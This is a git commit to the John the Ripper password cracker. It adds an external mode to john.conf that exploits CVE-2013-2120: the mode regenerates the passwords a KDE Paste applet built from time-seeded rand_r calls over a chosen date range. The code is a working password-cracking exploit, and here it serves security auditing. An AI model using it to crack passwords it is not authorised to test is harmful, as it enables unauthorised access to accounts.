magnumripper__JohnTheRipper
commit 0238632c45b8f2d9b03c1c25ab97b7083e7e6111
Author:     Michael Samuel <mik@miknet.net>
AuthorDate: Tue Jun 11 07:17:40 2013 +0200
Commit:     magnum <john.magnum@hushmail.com>
CommitDate: Tue Jun 11 07:18:55 2013 +0200

    Add External:KDEPaste. This takes advantage of CVE-2013-2120 to find seeds
    that KDE Paste applet uses to generate passwords.

diff --git a/run/john.conf b/run/john.conf
index 1011ed97a..e84cc7d84 100644
--- a/run/john.conf
+++ b/run/john.conf
@@ -1246,6 +1246,89 @@ void restore()
 	lastid = id[--last];
 }
 
+# This takes advantage of CVE-2013-2120 to find seeds that KDE Paste applet
+# uses to generate passwords.
+# Contributed by Michael Samuel <mik@miknet.net>
+# http://www.openwall.com/lists/john-users/2013/06/11/1
+[List.External:KDEPaste]
+
+int charset[95];
+int charset_length, password_length, endTime, startTime, msec;
+
+void init()
+{
+	password_length = 8; /* Change this to match config */
+	endTime   = 1375279200; /* Aug 1 2013  - Change this as necessary */
+	startTime = 1343743200; /* Aug 1 2012  - Change this as necessary */
+
+	msec = 1; /* msec is never 0 - it would crash the applet */
+
+	charset_length = 0;
+	int c;
+
+/* Comment out classes that you don't need, but keep the order the same */
+/* Lowers */
+	c = 'a'; while (c <= 'z') charset[charset_length++] = c++;
+/* Uppers */
+	c = 'A'; while (c <= 'Z') charset[charset_length++] = c++;
+/* Numbers */
+	c = '0'; while (c <= '9') charset[charset_length++] = c++;
+	charset[charset_length++] = '0'; /* Yep, it's there twice */
+/* Symbols */
+	c = '!'; while (c <= '/') charset[charset_length++] = c++;
+	c = ':'; while (c <= '@') charset[charset_length++] = c++;
+	c = '['; while (c <= '`') charset[charset_length++] = c++;
+	c = '{'; while (c <= '~') charset[charset_length++] = c++;
+}
+
+void generate()
+{
+	int i, rand_seed, rand_result;
+
+/* Terminate once we've generated for all *
+ * of the time range (Plus a bit more...) */
+	if (endTime + 1000 < startTime) {
+		word = 0;
+		return;
+}
+
+/* Skip msecs that would generate dupes */
+	while(endTime % msec != 0) {
+		if(++msec > 999) {
+			endTime--;
+			msec = 1;
+		}
+	}
+
+	rand_seed = endTime / msec;
+
+	i = 0;
+	while(i < password_length) {
+		/* This is rand_r() as used in eglibc */
+		rand_seed *= 1103515245;
+		rand_seed += 12345;
+		rand_result = (rand_seed >> 16) & 2047;
+
+		rand_seed *= 1103515245;
+		rand_seed += 12345;
+		rand_result <<= 10;
+		rand_result ^= (rand_seed >> 16) & 1023;
+
+		rand_seed *= 1103515245;
+		rand_seed += 12345;
+		rand_result <<= 10;
+		rand_result ^= (rand_seed >> 16) & 1023;
+
+		word[i++] = charset[rand_result % charset_length];
+	}
+	word[i] = 0;
+
+	if(++msec > 999) {
+		endTime--;
+		msec = 1;
+	}
+}
+
 # Try sequences of adjacent keys on a keyboard as candidate passwords
 [List.External:Keyboard]
 int maxlength, length;	// Maximum password length to try, current length
